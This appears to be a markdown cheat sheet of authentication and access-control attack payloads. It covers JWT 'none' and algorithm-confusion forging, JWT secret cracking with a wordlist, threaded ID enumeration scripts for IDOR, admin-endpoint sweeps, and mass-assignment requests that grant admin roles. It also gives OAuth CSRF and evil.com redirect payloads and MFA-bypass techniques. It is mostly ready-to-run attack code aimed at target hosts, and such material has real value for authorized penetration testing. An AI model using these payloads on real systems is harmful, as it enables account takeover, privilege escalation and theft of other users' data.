# Auth & Access Control Attack Payloads

## JWT Manipulation

### Algorithm None Attack

**Decode original token:**
```bash
echo "JWT_TOKEN_HERE" | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
"
```

**Craft unsigned token with none algorithm:**
```python
import base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234", "role": "admin", "is_admin": True}

header_enc = b64url_encode(json.dumps(header, separators=(',', ':')))
payload_enc = b64url_encode(json.dumps(payload, separators=(',', ':')))
token = f"{header_enc}.{payload_enc}."
print(f"Forged token: {token}")

# Try case variations
for alg in ["none", "None", "NONE", "nOnE"]:
    h = {"alg": alg, "typ": "JWT"}
    h_enc = b64url_encode(json.dumps(h, separators=(',', ':')))
    print(f"{alg}: {h_enc}.{payload_enc}.")
```

### RS256 to HS256 Confusion

```python
import jwt, requests, json
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm

# Obtain server's public key from JWKS endpoint
response = requests.get("https://target.com/.well-known/jwks.json")
jwks = response.json()
public_key = RSAAlgorithm.from_jwk(json.dumps(jwks['keys'][0]))
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Sign malicious payload with public key as HMAC secret
malicious_payload = {
    "sub": "admin", "role": "admin",
    "is_admin": True, "exp": 9999999999
}
forged_token = jwt.encode(malicious_payload, public_key_pem, algorithm="HS256")

# Test
headers = {"Authorization": f"Bearer {forged_token}"}
r = requests.get("https://target.com/api/admin/users", headers=headers)
print(r.status_code, r.text[:200])
```

### JWT Secret Brute-Force

```bash
# hashcat
hashcat -m 16500 captured_jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 captured_jwt.txt common_jwt_secrets.txt --rules-file /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_hash.txt

# jwt_tool
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9... -C -d /usr/share/wordlists/rockyou.txt
```

**Common JWT secrets wordlist:**
```
secret
password
123456
jwt_secret
mysecret
app_secret
session_secret
your-secret-key
changeme
development
production
admin
key
token
jwt
private
supersecret
s3cr3t
SecretKey
JWTSecret
API_SECRET
SECRET_KEY
flask-secret
django-secret
rails-secret
```

**Forge after cracking:**
```python
import jwt
SECRET = "cracked_secret"
payload = {"sub": "1", "username": "admin", "role": "admin", "exp": 9999999999}
forged = jwt.encode(payload, SECRET, algorithm="HS256")
print(forged)
```

---

## IDOR / BOLA Probing

### Two-Account Test Script

```python
#!/usr/bin/env python3
"""BOLA two-account test: access User A's resource as User B."""
import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument('--base-url', required=True)
parser.add_argument('--token-a', required=True, help='Token for User A (resource owner)')
parser.add_argument('--token-b', required=True, help='Token for User B (attacker)')
parser.add_argument('--resource-id', required=True)
parser.add_argument('--endpoint', default='/api/documents/{id}')
args = parser.parse_args()

url = args.base_url + args.endpoint.replace('{id}', args.resource_id)

r_a = requests.get(url, headers={'Authorization': f'Bearer {args.token_a}'})
print(f"[User A] Status: {r_a.status_code} -- expected 200")

r_b = requests.get(url, headers={'Authorization': f'Bearer {args.token_b}'})
print(f"[User B] Status: {r_b.status_code} -- expected 403/404, VULN if 200")

if r_b.status_code == 200:
    print("[VULNERABLE] BOLA confirmed")
    print(f"Response: {r_b.text[:500]}")
```

### Sequential ID Enumeration

```python
import requests, threading

def probe_resource(base_url, resource_id, session_cookie, results):
    url = f"{base_url}/{resource_id}"
    r = requests.get(url, cookies={"session": session_cookie})
    if r.status_code == 200:
        results.append((resource_id, r.json()))
        print(f"[+] Found resource {resource_id}: {r.text[:100]}")

session_cookie = "your_session_here"
base_url = "https://target.com/api/invoices"
results = []
threads = []
for i in range(1, 10000):
    t = threading.Thread(target=probe_resource, args=(base_url, i, session_cookie, results))
    threads.append(t)
    t.start()
    if len(threads) >= 50:
        for t in threads: t.join()
        threads = []
print(f"Found {len(results)} accessible resources")
```

### Mass ID Sweep (Bash)

```bash
for i in $(seq 1 1000); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer ATTACKER_TOKEN" \
        "https://target.com/api/orders/$i")
    if [ "$STATUS" = "200" ]; then
        echo "ID $i: ACCESSIBLE"
        curl -s -H "Authorization: Bearer ATTACKER_TOKEN" \
            "https://target.com/api/orders/$i" | python3 -m json.tool
    fi
done
```

### UUID Enumeration

```bash
# UUIDs may leak in profile picture URLs, export filenames, etc.
# /uploads/USER_UUID/profile.jpg -> try GET /api/users/USER_UUID/
ffuf -u "https://target.com/api/documents/FUZZ" \
  -w known_user_uuids.txt \
  -H "Cookie: session=YOUR_SESSION" \
  -fc 404
```

### Parameter Pollution / Type Confusion

```bash
GET /api/orders?id[]=1&id[]=1337
GET /api/orders?id=1,1337
GET /api/orders?id=1337.0
GET /api/orders?id=1.337e3
```

### Hidden IDOR via Indirect References

```bash
# Export/download endpoints often lack ownership check
GET /api/export?user_id=1337&format=csv
GET /api/reports/download/1337.pdf
GET /api/audit-log?account_id=1337

# Notification/activity endpoints
GET /api/notifications?user_id=1337
GET /api/activity?actor_id=1337

# File references
GET /files/1337/invoice.pdf
GET /uploads/user-1337/document.pdf
```

### HTTP Method Override for IDOR

```bash
# Some apps check auth for GET but not POST/PATCH
curl -X POST "https://target.com/api/admin/users/1337" \
  -H "Cookie: session=low_privilege_session" \
  -d '{"action": "get"}'

# Method override headers
curl -X POST "https://target.com/api/documents/1337" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: session=low_priv"
```

---

## BFLA Probing -- Admin Functions with Regular User Token

```bash
ADMIN_ENDPOINTS=(
    "/api/admin/users"
    "/api/admin/users/5/delete"
    "/api/users/5/promote"
    "/api/admin/export/all"
    "/api/management/stats"
    "/internal/debug/logs"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    echo -n "Testing $endpoint: "
    curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer USER_LEVEL_TOKEN" \
        "https://target.com$endpoint"
    echo
done
```

---

## Mass Assignment Escalation

### Role/Admin Flag Injection

**Django REST Framework:**
```http
PATCH /api/users/me/ HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"username": "attacker", "email": "a@b.com", "is_staff": true, "is_superuser": true}
```

**Rails:**
```http
PUT /users/profile HTTP/1.1
Content-Type: application/json

{"user": {"name": "Attacker", "admin": true, "role": "superadmin"}}
```

**Node.js/MongoDB:**
```http
PUT /api/users/me HTTP/1.1
Content-Type: application/json

{"name": "Attacker", "role": "admin", "permissions": ["read", "write", "admin"]}
```

**Laravel:**
```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"name": "Attacker", "email": "a@b.com", "password": "pass", "is_admin": 1, "role_id": 1}
```

### Verify Escalation

```bash
curl -X PATCH https://target.com/api/users/me \
    -H 'Content-Type: application/json' \
    -H 'Authorization: Bearer USER_TOKEN' \
    -d '{"first_name": "test", "is_admin": true, "is_staff": true, "role": "admin", "is_superuser": true}'

# Check result
curl https://target.com/api/users/me \
    -H 'Authorization: Bearer USER_TOKEN' | python3 -m json.tool | grep -i "admin\|staff\|role"
```

### Nested Mass Assignment

```json
{
    "username": "attacker",
    "password": "pass",
    "profile": { "name": "Attacker" },
    "account": { "subscription": "enterprise", "credits": 999999 }
}
```

```json
{
    "profile": {
        "display_name": "test",
        "user": { "is_admin": true, "role": "SUPER_ADMIN" }
    }
}
```

### Second-Order Mass Assignment

```bash
# Step 1: Inject org_id via profile update
PATCH /api/users/me
{"name": "Attacker", "org_id": 1337}

# Step 2: Subsequent requests scoped to org 1337
GET /api/org/documents  # Returns org 1337's documents
```

---

## OAuth Attack Payloads

### CSRF on OAuth (Missing State)

```bash
# 1. Initiate OAuth as attacker, capture callback URL with code
# 2. Send victim to callback URL before code expires (~60s)
# 3. If app doesn't validate state, victim's session binds to attacker's account
```

**CSRF PoC HTML:**
```html
<html><body>
<img src="https://app.com/oauth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE" width=1 height=1>
</body></html>
```

### Open Redirect in redirect_uri

```bash
redirect_uri=https://legit-app.com/callback?next=https://evil.com
redirect_uri=https://legit-app.com/../../evil.com/callback
redirect_uri=https://evil.legit-app.com/callback
redirect_uri=https://legit-app.com.evil.com/callback
```

---

## GraphQL Payloads

### Full Schema Dump

```graphql
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

### Targeted Type Inspection

```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type { name kind }
    }
  }
}
```

### One-Liner Introspection via curl

```bash
curl -s -X POST https://target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
    | python3 -m json.tool | grep -A2 '"name"'
```

---

## Privilege Escalation via MFA / Step-Skip

### Response Manipulation

```bash
# Intercept MFA response:
# Change: {"status": "mfa_required"} -> {"status": "success", "token": "..."}
# Or change HTTP 403 -> HTTP 200, {"success": false} -> {"success": true}
```

### Forced Browsing

```bash
# Skip MFA step: /login -> /mfa -> /dashboard
# Try /dashboard directly after /login
curl "https://target.com/dashboard" -H "Cookie: session=SESSION_AFTER_PASSWORD_ONLY"
```
